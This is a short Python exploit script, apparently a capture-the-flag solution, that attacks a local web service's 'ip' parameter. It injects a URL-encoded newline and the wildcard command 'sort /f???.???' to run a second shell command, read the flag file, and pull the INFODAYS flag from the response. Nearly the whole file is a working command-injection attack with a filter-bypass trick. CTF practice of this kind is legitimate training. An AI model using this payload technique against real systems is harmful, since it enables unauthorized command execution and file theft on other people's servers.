#!/usr/bin/env python3
import requests

URL = "http://localhost:8001"

# The raw payload with actual newline character
# We need to send %0a as literal characters, not URL encoded twice
payload = "127.0.0.1%0asort%20/f???.???"

# Use a custom URL to prevent double encoding
url_with_payload = f"{URL}/?ip={payload}"

print(f"[+] Payload: {payload}")
r = requests.get(url_with_payload)

# Look for flag in response
for line in r.text.split('\n'):
    if 'INFODAYS{' in line:
        import re
        match = re.search(r'INFODAYS\{[^}]+\}', line)
        if match:
            print(f"\n[+] FLAG: {match.group()}")
            break
else:
    print("[-] Flag not found")
    # Show the pre content
    if '<pre>' in r.text:
        pre = r.text.split('<pre>')[1].split('</pre>')[0]
        print(f"\nPre content:\n{pre}")
